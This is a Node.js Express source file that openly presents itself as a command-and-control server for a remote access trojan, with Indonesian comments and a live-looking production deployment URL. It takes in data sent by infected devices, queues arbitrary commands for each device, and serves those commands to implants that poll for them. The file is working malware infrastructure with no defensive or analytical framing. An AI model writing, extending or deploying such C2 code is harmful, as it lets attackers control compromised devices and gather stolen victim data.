const express = require('express');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ===== DATA STORE =====
let devices = {};
let logs = [];
let commandQueue = {};

// ===== API ROUTES =====

// Get all devices
app.get('/api/devices', (req, res) => {
    const list = Object.values(devices).map(d => ({
        ...d,
        status: d.connected ? 'online' : 'offline'
    }));
    res.json(list);
});

// Get logs
app.get('/api/logs', (req, res) => {
    const limit = parseInt(req.query.limit) || 30;
    res.json(logs.slice(-limit));
});

// Get stats
app.get('/api/stats', (req, res) => {
    const total = Object.keys(devices).length;
    const online = Object.values(devices).filter(d => d.connected).length;
    res.json({
        total_devices: total,
        online_devices: online,
        total_logs: logs.length,
        uptime: process.uptime()
    });
});

// ===== TERIMA DATA DARI RAT VIA HTTP =====
app.post('/api/log', (req, res) => {
    const { type, data, timestamp } = req.body;
    console.log(`[HTTP] ${type}:`, data);
    
    // Simpan ke log
    logs.push({
        type: type,
        data: data,
        timestamp: timestamp || Date.now(),
        source: 'http'
    });
    
    res.json({ status: 'ok' });
});

// ===== KIRIM COMMAND KE DEVICE (via polling) =====
app.get('/api/command/:deviceId/:command', (req, res) => {
    const { deviceId, command } = req.params;
    
    if (!devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    // Simpan command ke queue
    if (!commandQueue[deviceId]) commandQueue[deviceId] = [];
    commandQueue[deviceId].push({ type: 'command', command, timestamp: Date.now() });
    
    console.log(`[CMD] ${command} → ${deviceId}`);
    
    res.json({ status: 'queued', device: deviceId, command });
});

// ===== AMBIL COMMAND DARI DEVICE (polling) =====
app.get('/api/poll/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    
    if (commandQueue[deviceId] && commandQueue[deviceId].length > 0) {
        const cmd = commandQueue[deviceId].shift();
        res.json(cmd);
    } else {
        res.json({ command: 'none' });
    }
});

// ===== HEALTH CHECK =====
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        version: '2026.0',
        uptime: process.uptime(),
        devices: Object.keys(devices).length
    });
});

// ===== START SERVER =====
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[C2] Server running on port ${PORT}`);
    console.log(`[C2] Dashboard API: https://quantum-c2-backend-production.up.railway.app`);
});
